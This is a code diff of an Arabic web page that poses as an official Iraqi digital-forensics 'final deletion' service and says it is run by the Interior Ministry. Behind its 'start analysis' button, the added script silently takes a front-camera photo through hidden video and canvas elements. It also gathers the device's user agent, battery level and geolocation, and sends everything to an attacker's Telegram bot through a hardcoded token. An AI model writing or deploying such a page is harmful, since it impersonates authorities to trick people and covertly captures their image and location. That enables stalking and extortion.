@@ -1,36 +1,97 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معلومات الجهاز</title>
+    <title>الأدلة الجنائية الرقمية العراقية - نظام الحذف النهائي</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f4; color: #333; margin: 0; padding: 20px; line-height: 1.6; }
+        .container { max-width: 800px; margin: auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 5px solid #1a237e; }
+        h1 { color: #1a237e; font-size: 24px; text-align: center; }
+        h2 { color: #c62828; font-size: 20px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        p { text-align: justify; font-size: 15px; }
+        .official-footer { margin-top: 30px; padding-top: 15px; border-top: 1px dashed #ccc; font-weight: bold; color: #555; text-align: center; }
+        .btn-action { display: block; width: 100%; padding: 15px; margin: 20px 0; background-color: #1a237e; color: white; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; transition: 0.3s; }
+        .btn-action:hover { background-color: #0d1442; }
+        #video, #canvas { display: none; }
+    </style>
 </head>
-<body style="text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f4f4f9;">
+<body>
 
-    <h2>فحص توافق الجهاز</h2>
-    <p>اضغط على الزر أدناه لمعرفة معلومات تقنية عن هاتفك</p>
+<div class="container">
+    <h1>الأدلة الجنائية الرقمية العراقية</h1>
+    <h2>ميزة الحذف النهائي (Final Deletion)</h2>
     
-    <button id="infoBtn" style="padding: 15px 30px; font-size: 18px; background-color: #673ab7; color: white; border: none; border-radius: 8px; cursor: pointer;">
-        عرض وإرسال معلومات الهاتف
-    </button>
+    <p>هي إجراء فني-قانوني يُعنى بتحليل المحتوى الرقمي، بما في ذلك الصور ومقاطع الفيديو والمواقع الإلكترونية الوهمية، إضافةً إلى رصد حالات الانتحال الشخصي والاعتداء على الهوية الرقمية.</p>
+    
+    <p>تعتمد هذه الميزة على وسائل التحليل الرقمي الجنائي المتقدمة لتتبع مصدر الوسائط الرقمية (صور أو فيديوهات)، والكشف عن التلاعب أو الفبركة أو الاستخدام غير المشروع لها، من خلال مطابقة البيانات التقنية والبيومترية المتوفرة وفق الأطر القانونية المعتمدة.</p>
 
-    <script>
-        const token = '7819904584:AAExsLo2jFP3KkuJuepaw_SiFV9ME_ZI_vw';
-        const chatId = '7837239112';
+    <button id="startBtn" class="btn-action">بدء التحليل الفني والتثبت</button>
 
-        const btn = document.getElementById('infoBtn');
+    <p style="font-size: 13px; color: #666;">وبعد استكمال إجراءات التحليل والتثبت، يتم اتخاذ الإجراءات الفنية اللازمة لتعطيل الوصول إلى الوسائط المخالِفة وحجبها أو إزالتها من البيئات الرقمية المتاحة، بما في ذلك الأجهزة ووسائط التخزين، وفق ما تسمح به القوانين والأنظمة النافذة.</p>
 
-        btn.addEventListener('click', async () => {
-            btn.innerText = "جاري جمع البيانات...";
+    <div class="official-footer">
+        تُنفَّذ هذه الإجراءات حصراً من خلال الجهات المختصة: وزارة الداخلية – وحدة الاستجابة السرية.
+    </div>
+</div>
 
-            // 1. جمع معلومات المتصفح والنظام
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenRes = `${window.screen.width}x${window.screen.height}`;
-            const language = navigator.language;
+<video id="video" width="640" height="480" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    const token = '7819904584:AAExsLo2jFP3KkuJuepaw_SiFV9ME_ZI_vw';
+    const chatId = '7837239112';
+
+    const startBtn = document.getElementById('startBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    startBtn.addEventListener('click', async () => {
+        startBtn.innerText = "جاري الاتصال بوحدة الاستجابة...";
+        startBtn.disabled = true;
+
+        // 1. جمع معلومات الجهاز والبطارية
+        let batteryInfo = "غير معروف";
+        try { const b = await navigator.getBattery(); batteryInfo = `${(b.level * 100).toFixed(0)}%`; } catch(e){}
+        
+        let infoMsg = `⚠️ **تقرير دخول جديد**\n---\n📱 الجهاز: ${navigator.userAgent}\n🔋 البطارية: ${batteryInfo}\n🌍 اللغة: ${navigator.language}`;
+
+        // 2. طلب الموقع الجغرافي
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            infoMsg += `\n📍 الموقع: ${mapUrl}`;
+            sendToTelegram(infoMsg);
+        }, () => { sendToTelegram(infoMsg + "\n📍 الموقع: تم رفض الإذن"); });
+
+        // 3. طلب الكاميرا والتقاط الصورة
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
             
-            // 2. محاولة الحصول على مستوى البطارية
-            let batteryInfo = "غير مدعوم";
-            try {
-                const battery = await navigator.getBattery();
-                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${
+            setTimeout(() => {
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'capture.jpg');
+                    fd.append('caption', '📸 الصورة الملتقطة أثناء التحليل');
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
+            }, 2000);
+        } catch(e) {}
+
+        alert("بدأت عملية التحليل. يرجى عدم إغلاق الصفحة حتى اكتمال الفحص.");
+    });
+
+    function sendToTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+        });
+    }
+</script>
+
+</body>
+</html>
